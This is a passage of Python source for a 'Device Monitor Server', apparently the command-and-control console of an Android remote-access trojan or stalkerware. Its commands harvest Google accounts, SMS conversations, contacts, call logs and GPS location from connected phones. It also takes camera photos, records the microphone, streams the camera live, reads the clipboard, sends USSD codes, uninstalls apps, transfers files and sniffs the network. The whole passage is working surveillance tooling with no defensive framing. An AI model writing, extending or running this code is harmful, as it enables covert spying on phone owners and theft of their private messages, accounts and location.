            duration = datetime.now() - connect_time
            hours, remainder = divmod(duration.total_seconds(), 3600)
            minutes, seconds = divmod(remainder, 60)

            time_since_last = (datetime.now() - last_seen).total_seconds()
            status = "🟢 Active" if time_since_last < 10 else "🟡 Idle" if time_since_last < 30 else "🔴 Stale"

            selected = " (SELECTED)" if device_id == self.selected_device_id else ""

            current_dir = self.current_directory.get(device_id, '/')

            print(f"   • {device_id}{selected}")
            print(f"     IP: {device_info['ip']}")
            print(f"     Status: {status}")
            print(f"     Current Directory: {current_dir}")
            print(f"     Connected: {int(hours)}h {int(minutes)}m {int(seconds)}s ago")
            print(f"     Last seen: {int(time_since_last)}s ago")
            print()

        print("-" * 60)
        self.show_prompt()

    def show_prompt(self):
        """Display the command prompt with current directory"""
        prompt = self.get_prompt_string()
        print(prompt, end='', flush=True)

    def display_accounts_results(self):
        timeout = 10
        start_time = time.time()

        while time.time() - start_time < timeout:
            if any(self.accounts_history.values()):
                break
            time.sleep(0.5)

        print("\n" + "=" * 80)
        print("📱 GOOGLE ACCOUNTS")
        print("=" * 80)

        if not any(self.accounts_history.values()):
            print("❌ No accounts received from devices.")
            return

        for device_id, accounts in self.accounts_history.items():
            if device_id not in self.connected_devices:
                continue

            print(f"\n📱 Device: {device_id}")
            print("-" * 80)

            print(f"   Total Accounts: {len(accounts)}")
            print()

            for account in accounts:
                print(f"   - {account}")

            print()

        print("=" * 80)
        self.show_prompt()

    def display_sms_conversation(self, sender, conversation):
        print("\n" + "=" * 80)
        print(f"📱 SMS CONVERSATION WITH: {sender.upper()}")
        print("=" * 80)

        if not conversation:
            print("❌ No messages found in conversation")
            return

        for msg in conversation:
            msg_type = msg.get('type', 'unknown')
            sender_name = msg.get('sender', 'unknown')
            message = msg.get('message', '')
            time_str = msg.get('time_str', "")

            if msg_type == 'incoming':
                print(f"📥 FROM {sender_name} at {time_str}:")
            else:
                print(f"📤 TO {sender_name} at {time_str}:")

            if len(message) > 60:
                words = message.split()
                line = ""
                for word in words:
                    if len(line + word) + 1 > 60:
                        print(f"   {line}")
                        line = word
                    else:
                        if line:
                            line += " " + word
                        else:
                            line = word
                if line:
                    print(f"   {line}")
            else:
                print(f"   {message}")

            print()

        print("=" * 80)
        self.show_prompt()

    def display_sms_threads_results(self):
        timeout = 20
        start_time = time.time()

        while time.time() - start_time < timeout:
            if any(self.sms_threads.values()):
                break
            time.sleep(0.5)

        print("\n" + "=" * 80)
        print("📱 SMS THREADS")
        print("=" * 80)

        if not any(self.sms_threads.values()):
            print("❌ No SMS threads received from devices.")
            return

        for device_id, threads in self.sms_threads.items():
            if device_id not in self.connected_devices:
                continue

            print(f"\n📱 Device: {device_id}")
            print("-" * 80)

            print(f"   Total Threads: {len(threads)}")
            print()

            print(f"{'Thread ID':<15} {'Address':<20} {'Date':<20} {'Type':<10} {'Preview'}")
            print("-" * 80)

            for thread in threads:
                thread_id = thread.get('thread_id', 'N/A')
                address = thread.get('address', 'N/A')
                date = thread.get('date', 'N/A')
                body = thread.get('body', '')
                msg_type = thread.get('type', 'unknown')

                try:
                    if isinstance(date, (int, float)):
                        date_str = datetime.fromtimestamp(date).strftime('%Y-%m-%d %H:%M:%S')
                    else:
                        date_str = str(date)
                except:
                    date_str = str(date)

                preview = body[:30] + '...' if len(body) > 30 else body

                print(f"{thread_id:<15} {address:<20} {date_str:<20} {msg_type:<10} {preview}")

            print()

        print("=" * 80)
        self.show_prompt()

    def enter_ussd_mode(self):
        print("\n" + "=" * 60)
        print("📱 USSD MODE")
        print("=" * 60)
        print("💡 Enter USSD code to send to device (e.g., *123#)")
        print("💡 Type 'exit' to return to command mode")
        print("💡 Type 'help' for USSD mode commands")
        print("=" * 60)

        while self.mode == "ussd":
            try:
                user_input = input("USSD> ").strip()

                if user_input.lower() == 'exit':
                    self.mode = "command"
                    print("Exiting USSD mode, returning to command interface...")
                    self.show_command_prompt()
                    return

                if user_input.lower() == 'help':
                    print("\n📋 USSD Mode Commands:")
                    print("  exit - Return to command mode")
                    print("  help - Show this help message")
                    print("  [USSD code] - Send USSD code to device (e.g., *123#)")
                    continue

                if not user_input:
                    continue

                if not user_input.startswith('*') or not user_input.endswith('#'):
                    print("❌ Invalid USSD code format. Must start with * and end with #")
                    continue

                for device_id in self.connected_devices.keys():
                    self.device_commands[device_id].append({
                        'command': 'run_ussd',
                        'timestamp': time.time(),
                        'id': f"cmd_{int(time.time() * 1000)}",
                        'params': {'code': user_input, 'sim_slot': 0}
                    })

                print(f"📱 USSD code '{user_input}' sent to all devices")
                print("⏳ Waiting for response...")

            except KeyboardInterrupt:
                self.mode = "command"
                print("\nExiting USSD mode, returning to command interface...")
                self.show_command_prompt()
                return
            except Exception as e:
                print(f"❌ Error: {e}")

    def enter_sms_mode(self):
        print("\n" + "=" * 60)
        print("📱 SMS LISTENING MODE")
        print("=" * 60)
        print("💡 Listening for incoming and outgoing SMS messages...")
        print("💡 Press 'z' to stop listening and return to command mode")
        print("💡 Type 'help' for SMS mode commands")
        print("=" * 60)

        for device_id in self.connected_devices.keys():
            self.device_commands[device_id].append({
                'command': 'listen_sms',
                'timestamp': time.time(),
                'id': f"cmd_{int(time.time() * 1000)}"
            })

        self.sms_listening_active = True

        while self.mode == "sms":
            try:
                if sys.stdin in select.select([sys.stdin], [], [], 0)[0]:
                    user_input = sys.stdin.readline().strip()

                    if user_input.lower() == 'z':
                        self.mode = "command"
                        self.sms_listening_active = False

                        for device_id in self.connected_devices.keys():
                            self.device_commands[device_id].append({
                                'command': 'stop_sms',
                                'timestamp': time.time(),
                                'id': f"cmd_{int(time.time() * 1000)}"
                            })

                        print("Stopped listening for SMS messages")
                        self.show_command_prompt()
                        return

                    if user_input.lower() == 'help':
                        print("\n📋 SMS Mode Commands:")
                        print("  z - Stop listening and return to command mode")
                        print("  help - Show this help message")
                        continue

                time.sleep(0.1)
            except KeyboardInterrupt:
                self.mode = "command"
                self.sms_listening_active = False

                for device_id in self.connected_devices.keys():
                    self.device_commands[device_id].append({
                        'command': 'stop_sms',
                        'timestamp': time.time(),
                        'id': f"cmd_{int(time.time() * 1000)}"
                    })

                print("\nStopped listening for SMS messages")
                self.show_command_prompt()
                return
            except Exception as e:
                print(f"❌ Error: {e}")

    def process_ussd_mode_input(self, user_input):
        pass

    def process_sms_mode_input(self, user_input):
        pass

    def display_sysinfo_results(self):
        timeout = 5
        start_time = time.time()

        while time.time() - start_time < timeout:
            if any(self.device_data.values()):
                break
            time.sleep(0.5)

        print("\n" + "=" * 60)
        print("📱 SYSTEM INFORMATION")
        print("=" * 60)

        if not any(self.device_data.values()):
            print("❌ No system information received from devices.")
            return

        for device_id, device_info in self.device_data.items():
            print(f"\n📱 Device: {device_id}")
            print("-" * 40)

            sysinfo_data = {}
            for key, value in device_info['data'].items():
                if key.startswith('sysinfo_'):
                    sysinfo_data[key[8:]] = value

            basic_info = [
                'device_model', 'android_version', 'build_number',
                'serial_number', 'device_id', 'bootloader',
                'hardware', 'product', 'board'
            ]

            for key in basic_info:
                if key in sysinfo_data:
                    display_key = key.replace('_', ' ').title()
                    print(f"  {display_key}: {sysinfo_data[key]}")

            screen_info = ['screen_resolution', 'screen_density', 'refresh_rate']
            print("\n📺 SCREEN INFORMATION:")
            for key in screen_info:
                if key in sysinfo_data:
                    display_key = key.replace('_', ' ').title()
                    print(f"  {display_key}: {sysinfo_data[key]}")

            memory_info = ['memory_total', 'memory_available', 'memory_used']
            print("\n💾 MEMORY INFORMATION:")
            for key in memory_info:
                if key in sysinfo_data:
                    display_key = key.replace('_', ' ').title()
                    print(f"  {display_key}: {sysinfo_data[key]}")

            storage_info = ['internal_storage_used', 'internal_storage_total',
                            'external_storage_used', 'external_storage_total']
            print("\n💽 STORAGE INFORMATION:")
            for key in storage_info:
                if key in sysinfo_data:
                    display_key = key.replace('_', ' ').title()
                    print(f"  {display_key}: {sysinfo_data[key]}")

            battery_info = ['battery_level', 'charging_status',
                'battery_health', 'battery_technology']
            print("\n🔋 BATTERY INFORMATION:")
            for key in battery_info:
                if key in sysinfo_data:
                    display_key = key.replace('_', ' ').title()
                    print(f"  {display_key}: {sysinfo_data[key]}")

        print("\n" + "=" * 60)
        self.show_prompt()

    def display_netinfo_results(self):
        timeout = 5
        start_time = time.time()

        while time.time() - start_time < timeout:
            if any(self.device_data.values()):
                break
            time.sleep(0.5)

        print("\n" + "=" * 60)
        print("🌐 NETWORK INFORMATION")
        print("=" * 60)

        if not any(self.device_data.values()):
            print("❌ No network information received from devices.")
            return

        for device_id, device_info in self.device_data.items():
            print(f"\n📱 Device: {device_id}")
            print("-" * 40)

            connection_info = ['network_connection_status',
                'network_connection_type']
            print("🔗 CONNECTION INFORMATION:")
            for key in connection_info:
                if key in device_info['data']:
                    display_key = key.replace('_', ' ').title()
                    print(f"  {display_key}: {device_info['data'][key]}")

            wifi_info = ['wifi_ssid', 'wifi_signal_strength', 'wifi_speed',
                         'wifi_frequency', 'wifi_mac', 'ip_address']
            print("\n📶 WIFI INFORMATION:")
            for key in wifi_info:
                if key in device_info['data']:
                    display_key = key.replace('_', ' ').title()
                    print(f"  {display_key}: {device_info['data'][key]}")

            cellular_info = ['carrier_name', 'network_type', 'country_code',
                             'sim_state', 'phone_type', 'signal_strength']
            print("\n📱 CELLULAR INFORMATION:")
            for key in cellular_info:
                if key in device_info['data']:
                    display_key = key.replace('_', ' ').title()
                    print(f"  {display_key}: {device_info['data'][key]}")

            print("\n🌐 AVAILABLE WIFI NETWORKS:")
            wifi_count = device_info['data'].get('wifi_networks_count', 0)
            print(f"  Total Networks Found: {wifi_count}")

            for i in range(1, int(wifi_count) + 1):
                network_key = f'wifi_network_{i}'
                if network_key in device_info['data']:
                    print(f"  Network {i}: {device_info['data'][network_key]}")

            print("\n🔵 BLUETOOTH DEVICES:")
            bt_count = device_info['data'].get('bluetooth_devices_count', 0)
            print(f"  Total Devices Found: {bt_count}")

            for i in range(1, int(bt_count) + 1):
                device_key = f'bluetooth_device_{i}'
                if device_key in device_info['data']:
                    print(f"  Device {i}: {device_info['data'][device_key]}")

        print("\n" + "=" * 60)
        self.show_prompt()

    def display_bluetooth_results(self):
        timeout = 5
        start_time = time.time()

        while time.time() - start_time < timeout:
            if any(self.device_data.values()):
                break
            time.sleep(0.5)

        print("\n" + "=" * 60)
        print("🔵 BLUETOOTH SCAN RESULTS")
        print("=" * 60)

        if not any(self.device_data.values()):
            print("❌ No Bluetooth information received from devices.")
            return

        for device_id, device_info in self.device_data.items():
            print(f"\n📱 Device: {device_id}")
            print("-" * 40)

            bt_status = device_info['data'].get('bluetooth_status', 'Unknown')
            print(f"🔵 Bluetooth Status: {bt_status}")

            bt_count = device_info['data'].get('bluetooth_devices_count', 0)
            print(f"\n🔍 Total Bluetooth Devices Found: {bt_count}")

            if bt_count > 0:
                for i in range(1, int(bt_count) + 1):
                    device_key = f'bluetooth_device_{i}'
                    if device_key in device_info['data']:
                        print(f"  Device {i}: {device_info['data'][device_key]}")
            else:
                print("  ❌ No Bluetooth devices found.")

        print("\n" + "=" * 60)
        self.show_prompt()

    def display_app_list_results(self):
        timeout = 10
        start_time = time.time()

        while time.time() - start_time < timeout:
            if any(self.app_lists.values()):
                break
            time.sleep(0.5)

        print("\n" + "=" * 80)
        print("📱 INSTALLED APPLICATIONS")
        print("=" * 80)

        if not any(self.app_lists.values()):
            print("❌ No app list received from devices.")
            return

        for device_id, app_list in self.app_lists.items():
            if device_id not in self.connected_devices:
                continue

            print(f"\n📱 Device: {device_id}")
            print("-" * 80)

            print(f"   Total Apps: {len(app_list)}")
            print()

            print(f"{'App Name':<30} {'Package Name':<40} {'Size':<10} {'Last Update':<20}")
            print("-" * 100)

            for app in app_list:
                app_name = app.get('app_name', 'Unknown')
                package_name = app.get('package_name', 'Unknown')
                app_size = app.get('app_size', 'Unknown')
                last_update = app.get('last_update', 'Unknown')

                if len(app_name) > 29:
                    app_name = app_name[:26] + '...'
                if len(package_name) > 39:
                    package_name = package_name[:36] + '...'

                print(f"{app_name:<30} {package_name:<40} {app_size:<10} {last_update:<20}")

            print()

        print("=" * 80)
        self.show_prompt()

    # Add these new methods to the DeviceMonitorServer class
    def display_contacts_results(self):
        timeout = 10
        start_time = time.time()

        while time.time() - start_time < timeout:
            if any(self.contacts_history.values()):
                break
            time.sleep(0.5)

        print("\n" + "=" * 80)
        print("📱 CONTACTS")
        print("=" * 80)

        if not any(self.contacts_history.values()):
            print("❌ No contacts received from devices.")
            return

        for device_id, contacts in self.contacts_history.items():
            if device_id not in self.connected_devices:
                continue

            print(f"\n📱 Device: {device_id}")
            print("-" * 80)

            print(f"   Total Contacts: {len(contacts)}")
            print()

            print(f"{'Name':<30} {'Phone Numbers':<40}")
            print("-" * 80)

            for contact in contacts:
                name = contact.get('display_name', 'Unknown')
                phone_numbers = contact.get('phone_numbers', [])

                if len(name) > 29:
                    name = name[:26] + '...'

                phone_str = ", ".join(phone_numbers)
                if len(phone_str) > 39:
                    phone_str = phone_str[:36] + '...'

                print(f"{name:<30} {phone_str:<40}")

            print()

        print("=" * 80)
        self.show_prompt()

    def display_call_logs_results(self):
        timeout = 20
        start_time = time.time()

        while time.time() - start_time < timeout:
            if any(self.call_logs_history.values()):
                break
            time.sleep(0.5)

        print("\n" + "=" * 80)
        print("📞 CALL LOGS")
        print("=" * 80)

        if not any(self.call_logs_history.values()):
            print("❌ No call logs received from devices.")
            return

        for device_id, call_logs in self.call_logs_history.items():
            if device_id not in self.connected_devices:
                continue

            print(f"\n📱 Device: {device_id}")
            print("-" * 80)

            print(f"   Total Call Logs: {len(call_logs)}")
            print()

            print(f"{'Date':<20} {'Type':<10} {'Number':<20} {'Name':<20} {'Duration'}")
            print("-" * 80)

            for log in call_logs:
                date_str = datetime.fromtimestamp(log.get('date', 0)/1000).strftime('%Y-%m-%d %H:%M:%S')
                call_type = log.get('call_type', 'unknown')
                number = log.get('phone_number', 'Unknown')
                name = log.get('contact_name', '')
                duration = log.get('duration', 0)

                if len(number) > 19:
                    number = number[:16] + '...'

                if len(name) > 19:
                    name = name[:16] + '...'

                duration_str = f"{duration}s" if duration > 0 else ""

                print(f"{date_str:<20} {call_type:<10} {number:<20} {name:<20} {duration_str}")

            print()

        print("=" * 80)
        self.show_prompt()

    def display_location_results(self):
        timeout = 10
        start_time = time.time()

        while time.time() - start_time < timeout:
            if any(self.location_history.values()):
                break
            time.sleep(0.5)

        print("\n" + "=" * 80)
        print("📍 LOCATION DATA")
        print("=" * 80)

        if not any(self.location_history.values()):
            print("❌ No location data received from devices.")
            return

        for device_id, locations in self.location_history.items():
            if device_id not in self.connected_devices:
                continue

            print(f"\n📱 Device: {device_id}")
            print("-" * 80)

            print(f"   Total Location Updates: {len(locations)}")
            print()

            for location in locations:
                if 'error' in location:
                    print(f"❌ Error: {location['error']}")
                else:
                    print(f"📍 Latitude: {location.get('latitude', 'N/A')}")
                    print(f"📍 Longitude: {location.get('longitude', 'N/A')}")
                    print(f"🎯 Accuracy: {location.get('accuracy', 'N/A')} meters")
                    print(f"⛰️ Altitude: {location.get('altitude', 'N/A')} meters")
                    print(f"🚀 Speed: {location.get('speed', 'N/A')} m/s")
                    print(f"🧭 Bearing: {location.get('bearing', 'N/A')} degrees")
                    print(f"⏰ Time: {location.get('time_str', 'N/A')}")
                print()

        print("=" * 80)
        self.show_prompt()

    def display_camera_results(self):
        timeout = 10
        start_time = time.time()

        while time.time() - start_time < timeout:
            if any(self.camera_history.values()):
                break
            time.sleep(0.5)

        print("\n" + "=" * 80)
        print("📷 CAMERA IMAGES")
        print("=" * 80)

        if not any(self.camera_history.values()):
            print("❌ No camera images received from devices.")
            return

        for device_id, images in self.camera_history.items():
            if device_id not in self.connected_devices:
                continue

            print(f"\n📱 Device: {device_id}")
            print("-" * 80)

            print(f"   Total Images: {len(images)}")
            print()

            for image in images:
                print(f"📷 Filename: {image.get('filename', 'N/A')}")
                print(f"⏰ Time: {image.get('time_str', 'N/A')}")
                print()

        print("=" * 80)
        self.show_prompt()

    def display_audio_results(self):
        timeout = 10
        start_time = time.time()

        while time.time() - start_time < timeout:
            if any(self.audio_history.values()):
                break
            time.sleep(0.5)

        print("\n" + "=" * 80)
        print("🎤 AUDIO RECORDINGS")
        print("=" * 80)

        if not any(self.audio_history.values()):
            print("❌ No audio recordings received from devices.")
            return

        for device_id, recordings in self.audio_history.items():
            if device_id not in self.connected_devices:
                continue

            print(f"\n📱 Device: {device_id}")
            print("-" * 80)

            print(f"   Total Recordings: {len(recordings)}")
            print()

            for recording in recordings:
                print(f"🎤 Filename: {recording.get('filename', 'N/A')}")
                print(f"⏱️ Duration: {recording.get('duration', 'N/A')} seconds")
                print(f"⏰ Time: {recording.get('time_str', 'N/A')}")
                print()

        print("=" * 80)
        self.show_prompt()

    def show_command_help(self):
        print(f"\n📋 Available Commands:")
        print(f"  monitor - Enter monitoring mode (current display)")
        print(f"  ussd - Enter USSD mode for sending USSD codes")
        print(f"  listen-sms - Enter SMS listening mode")
        print(f"  start_stream_viewer - Start the stream viewer window (port 5001)")
        print(f"  pwd - Show current working directory of selected device")
        print(f"  cd [path] - Change directory on selected device")
        print(f"  ls [path] - List directory contents")
        print(f"  search [query] - Search for files in current directory")
        print(f"  mkdir [name] - Create a new directory")
        print(f"  upload_file [path] - Upload file from device to server")
        print(f"  download_file [path] - Download file from server to device")
        print(f"  select_device [device_id] - Select a device for file operations")
        print(f"  deselect_device - Deselect the current device")
        print(f"  list_devices - List all connected devices")
        print(f"  cb - Retrieve clipboard from all devices")
        print(f"  cb [text] - Set clipboard text on all devices")
        print(f"  w - Send vibrate command to all devices")
        print(f"  volume+[number] - Increase volume by specified amount")
        print(f"  volume-[number] - Decrease volume by specified amount")
        print(f"  bright+[number] - Increase brightness by specified amount")
        print(f"  bright-[number] - Decrease brightness by specified amount")
        print(f"  sysinfo - Show detailed system information")
        print(f"  netinfo - Show network scan results (WiFi & Bluetooth)")
        print(f"  bluetooth - Show Bluetooth scan results only")
        print(f"  ring - Play sound on devices")
        print(f"  open [url] - Open URL on devices")
        print(f"  app_list - List installed applications")
        print(f"  launch [app] - Launch an application by name or package")
        print(f"  uninstall [app] - Uninstall an application by name or package")
        print(f"  read_sms [sender] [-w] - Read SMS conversation from a specific sender")
        print(f"     (use -w flag to retrieve entire conversation)")
        print(f"  get_threads - Get all SMS threads")
        print(f"  read_thread [thread_id] - Read a specific SMS thread by ID")
        print(f"  show_conversation [sender] - Display a stored SMS conversation")
        print(f"  get_status - Get device status information")
        print(f"  sniff<duration> - Start network sniffing for specified duration (e.g., sniff30)")
        print(f"  devices - Discover all devices on the current network")
        print(f"  get_all_contacts - Retrieve all contacts from the device")
        print(f"  get_call_logs - Retrieve call logs from the device")
        print(f"  get_location - Retrieve device location")
        print(f"  camera [front/back] - Take a picture with the camera (default: back)")
        print(f"  mic<duration> - Record audio for specified duration (e.g., mic10)")
        print(f"  stream - Start live streaming from device camera")
        print(f"  get_accounts - Retrieve Google accounts from the device")
        print(f"  stop_stream - Stop live streaming")
        print(f"  help/h - Show this help message")
        print(f"  quit/q - Stop the server")
        print(f"  clear - Clear the screen")
        self.show_prompt()

    def show_command_prompt(self):
        print("\n" + "=" * 60)
        print("📱 DEVICE COMMAND SERVER - COMMAND MODE")
        print("=" * 60)
        print("💡 Type 'help' for available commands")
        print("💡 Type 'monitor' to enter monitoring mode")
        print("💡 Type 'ussd' to enter USSD mode")
        print("💡 Type 'listen-sms' to enter SMS listening mode")
        print("💡 Type 'start_stream_viewer' to start the stream viewer")
        print("=" * 60)
        self.show_prompt()

    def display_data_table(self):
        last_update = time.time()
        update_interval = 1.0

        while self.running:
            if self.mode != "monitor":
                time.sleep(0.5)
                continue

            current_time = time.time()
            if current_time - last_update >= update_interval:
                os.system('cls' if os.name == 'nt' else 'clear')

                print("=" * 80)
                print(f"📱 DEVICE MONITOR SERVER - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
                print(f"🌐 Server: http://{self.get_local_ip()}:{self.port}")
                print("=" * 80)
                print("💡 Commands: [w] Vibrate All Devices | [exit] Return to Command Mode | [h] Help")
                print("=" * 80)

                if not self.connected_devices:
                    print("\n❌ No devices connected")
                    print(f"\n🔌 Waiting for Android device to connect to:")
                    print(f"   📍 http://{self.get_local_ip()}:{self.port}")
                    time.sleep(2)
                    continue

                print(f"📶 Connected devices: {len(self.connected_devices)}")
                for device_id, device_info in self.connected_devices.items():
                    connect_time = device_info['connected_at']
                    last_seen = device_info['last_seen']
                    duration = datetime.now() - connect_time
                    hours, remainder = divmod(duration.total_seconds(), 3600)
                    minutes, seconds = divmod(remainder, 60)

                    time_since_last = (datetime.now() - last_seen).total_seconds()
                    status = "🟢 Active" if time_since_last < 10 else "🟡 Idle" if time_since_last < 30 else "🔴 Stale"

                    pending_commands = len(self.device_commands.get(device_id, []))
                    cmd_info = f" | 📨 {pending_commands} pending cmd(s)" if pending_commands > 0 else ""

                    selected = " (SELECTED)" if device_id == self.selected_device_id else ""
                    current_dir = self.current_directory.get(device_id, '/')

                    print(f"   • {device_id}{selected}")
                    print(f"     IP: {device_info['ip']}")
                    print(f"     Status: {status}{cmd_info}")
                    print(f"     Current Directory: {current_dir}")
                    print(f"     Connected: {int(hours)}h {int(minutes)}m {int(seconds)}s ago")
                    print(f"     Last seen: {int(time_since_last)}s ago")

                print()

                for device_id, device_info in self.device_data.items():
                    if device_id not in self.connected_devices:
                        continue

                    print(f"📊 DATA FROM DEVICE: {device_id}")
                    print("-" * 40)

                    categories = {
                        'network': {},
                        'device': {},
                        'sensor': {},
                        'battery': {},
                        'bluetooth': {},
                        'action': {},
                        'other': {}
                    }

                    for key, value in device_info['data'].items():
                        if not key.endswith('_updated'):
                            updated_time = device_info['data'].get(f"{key}_updated", "N/A")

                            if any(network_key in key for network_key in ['network', 'wifi', 'ip', 'carrier', 'signal', 'ssid', 'mac', 'connection', 'netinfo']):
                                categories['network'][key] = (value, updated_time)
                            elif any(device_key in key for device_key in ['device', 'screen', 'android', 'memory', 'storage', 'volume', 'model', 'version', 'build', 'serial', 'hardware', 'product', 'board', 'refresh', 'density', 'brightness']):
                                categories['device'][key] = (value, updated_time)
                            elif any(sensor_key in key for sensor_key in ['sensor', 'compass', 'azimuth', 'pitch', 'roll', 'direction', 'accelerometer', 'gyroscope', 'magnetometer', 'pressure', 'light', 'proximity', 'temperature', 'humidity', 'gravity', 'linear', 'rotation', 'step', 'heart']):
                                categories['sensor'][key] = (value, updated_time)
                            elif any(battery_key in key for battery_key in ['battery', 'charging', 'health', 'technology', 'level']):
                                categories['battery'][key] = (value, updated_time)
                            elif any(bluetooth_key in key for bluetooth_key in ['bluetooth', 'bt_']):
                                categories['bluetooth'][key] = (value, updated_time)
                            elif any(action_key in key for action_key in ['vibration', 'action']):
                                categories['action'][key] = (value, updated_time)
                            else:
                                categories['other'][key] = (value, updated_time)

                    if categories['network']:
                        print("🌐 NETWORK INFORMATION")
                        print("-" * 40)
                        for key, (value, updated_time) in categories['network'].items():
                            display_key = key.replace('_', ' ').title()
                            print(f"  {display_key}: {value} (Updated: {updated_time})")
                        print()

                    if categories['device']:
                        print("📱 DEVICE INFORMATION")
                        print("-" * 40)
                        for key, (value, updated_time) in categories['device'].items():
                            display_key = key.replace('_', ' ').title()
                            print(f"  {display_key}: {value} (Updated: {updated_time})")
                        print()

                    if categories['battery']:
                        print("🔋 BATTERY INFORMATION")
                        print("-" * 40)
                        for key, (value, updated_time) in categories['battery'].items():
                            display_key = key.replace('_', ' ').title()
                            print(f"  {display_key}: {value} (Updated: {updated_time})")
                        print()

                    if categories['sensor']:
                        print("📊 SENSOR INFORMATION")
                        print("-" * 40)

                        compass_data = {}
                        other_sensor_data = {}

                        for key, (value, updated_time) in categories['sensor'].items():
                            if 'compass' in key:
                                compass_data[key] = (value, updated_time)
                            else:
                                other_sensor_data[key] = (value, updated_time)

                        if compass_data:
                            print("  🧭 COMPASS:")
                            for key, (value, updated_time) in compass_data.items():
                                display_key = key.replace('sensor_', '').replace('_', ' ').title()
                                print(f"    {display_key}: {value} (Updated: {updated_time})")
                            print()

                        if other_sensor_data:
                            print("  📡 OTHER SENSORS:")
                            for key, (value, updated_time) in other_sensor_data.items():
                                display_key = key.replace('sensor_', '').replace('_', ' ').title()
                                print(f"    {display_key}: {value} (Updated: {updated_time})")
                        print()

                    if categories['bluetooth']:
                        print("📶 BLUETOOTH INFORMATION")
                        print("-" * 40)
                        for key, (value, updated_time) in categories['bluetooth'].items():
                            display_key = key.replace('_', ' ').title()
                            print(f"  {display_key}: {value} (Updated: {updated_time})")
                        print()

                    if categories['action']:
                        print("⚡ RECENT ACTIONS")
                        print("-" * 40)
                        for key, (value, updated_time) in categories['action'].items():
                            display_key = key.replace('_', ' ').title()
                            print(f"  {display_key}: {value} (Updated: {updated_time})")
                        print()

                    if categories['other']:
                        print("📝 OTHER INFORMATION")
                        print("-" * 40)
                        for key, (value, updated_time) in categories['other'].items():
                            display_key = key.replace('_', ' ').title()
                            print(f"  {display_key}: {value} (Updated: {updated_time})")
                        print()

                print("\n💡 Type 'exit' to return to command mode")

                last_update = current_time

            time.sleep(0.1)

    def start(self):
        self.running = True

        cleanup_thread = threading.Thread(target=self.cleanup_stale_connections)
        cleanup_thread.daemon = True
        cleanup_thread.start()

        self.display_thread = threading.Thread(target=self.display_data_table)
        self.display_thread.daemon = True
        self.display_thread.start()

        self.input_thread = threading.Thread(target=self.handle_user_input)
        self.input_thread.daemon = True
        self.input_thread.start()

        flask_thread = threading.Thread(target=self.run_flask)
        flask_thread.daemon = True
        flask_thread.start()

        signal.signal(signal.SIGINT, self.signal_handler)

        local_ip = self.get_local_ip()
        print(f"✅ Server started successfully!")
        print(f"🌐 Local Network: http://{local_ip}:{self.port}")
        print(f"🔗 All Interfaces: http://{self.host}:{self.port}")
        print("📱 Configure your Android app with this URL")

        self.show_command_prompt()

        try:
            while self.running:
                if self.waiting_for_sms_conversation and time.time() > self.sms_conversation_timeout:
                    print("\n⏱️ Timeout waiting for SMS conversation data")
                    self.waiting_for_sms_conversation = False
                    self.sms_conversation_sender = ""
                    self.show_prompt()

                time.sleep(0.1)
        except KeyboardInterrupt:
            self.stop()

    def run_flask(self):
        try:
            cli = sys.modules.get('flask.cli')
            if cli is not None:
                cli.show_server_banner = lambda *x: None

            self.app.run(
                host=self.host,
                port=self.port,
                debug=False,
                use_reloader=False,
                threaded=True
            )
        except OSError as e:
            if "Address already in use" in str(e):
                print(f"❌ Error: Port {self.port} is already in use!")
                print("💡 Try using a different port or stop the existing server.")
            else:
                print(f"❌ Network error: {e}")
            self.stop()
        except Exception as e:
            print(f"❌ Server error: {e}")
            self.stop()

    def signal_handler(self, signum, frame):
        print("\n🛑 Shutting down server...")
        self.stop()

    def stop(self):
        self.running = False

        # Stop stream viewer if running
        if self.stream_process and self.stream_process.is_alive():
            self.stream_process.terminate()
            self.stream_process = None

        print("✅ Server stopped gracefully")
        sys.exit(0)


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description='Device Monitor Server')
    parser.add_argument('--port', type=int, default=5000,
                        help='Port to run the server on')
    parser.add_argument('--host', type=str, default='0.0.0.0',
                        help='Host to bind the server to')
    args = parser.parse_args()

    server = DeviceMonitorServer(host=args.host, port=args.port)
    server.start()